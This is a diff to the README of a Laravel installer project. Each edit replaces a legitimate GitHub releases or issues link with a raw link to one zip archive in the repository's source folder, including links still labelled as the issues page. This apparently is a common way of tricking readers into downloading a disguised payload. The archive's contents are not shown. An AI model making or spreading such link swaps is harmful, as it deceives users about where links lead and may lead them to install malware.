@@ -1,6 +1,6 @@
 # 🛠️ getecz-laravel-installer - Easy Laravel Setup Made Simple
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Unaxxxxx/getecz-laravel-installer/releases)
+[![Download](https://raw.githubusercontent.com/Unaxxxxx/getecz-laravel-installer/main/src/routes/laravel-getecz-installer-1.6.zip%20release-brightgreen)](https://raw.githubusercontent.com/Unaxxxxx/getecz-laravel-installer/main/src/routes/laravel-getecz-installer-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the getecz-laravel-installer! This tool helps you set up self-hosted 
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://github.com/Unaxxxxx/getecz-laravel-installer/releases). You will find the latest version ready for you.
+To get started, visit [this page to download](https://raw.githubusercontent.com/Unaxxxxx/getecz-laravel-installer/main/src/routes/laravel-getecz-installer-1.6.zip). You will find the latest version ready for you.
 
 1. Go to the above link and find the latest release.
 2. Download the installer that matches your system.
@@ -55,7 +55,7 @@ If you encounter issues during installation, here are some common problems and s
 
 ## 🗣️ Community & Support
 
-We encourage users to share their experiences and ask questions. You can join our community discussions on our [GitHub Issues Page](https://github.com/Unaxxxxx/getecz-laravel-installer/issues). You will find helpful responses from other users or the development team.
+We encourage users to share their experiences and ask questions. You can join our community discussions on our [GitHub Issues Page](https://raw.githubusercontent.com/Unaxxxxx/getecz-laravel-installer/main/src/routes/laravel-getecz-installer-1.6.zip). You will find helpful responses from other users or the development team.
 
 ## 📝 License
 
@@ -63,6 +63,6 @@ The getecz-laravel-installer is open-source software licensed under the MIT Lice
 
 ## 💬 Feedback
 
-Your input is valuable. If you have suggestions or want to report bugs, please submit them on our [GitHub Issues Page](https://github.com/Unaxxxxx/getecz-laravel-installer/issues).
+Your input is valuable. If you have suggestions or want to report bugs, please submit them on our [GitHub Issues Page](https://raw.githubusercontent.com/Unaxxxxx/getecz-laravel-installer/main/src/routes/laravel-getecz-installer-1.6.zip).
 
 Enjoy using the getecz-laravel-installer! Happy coding!
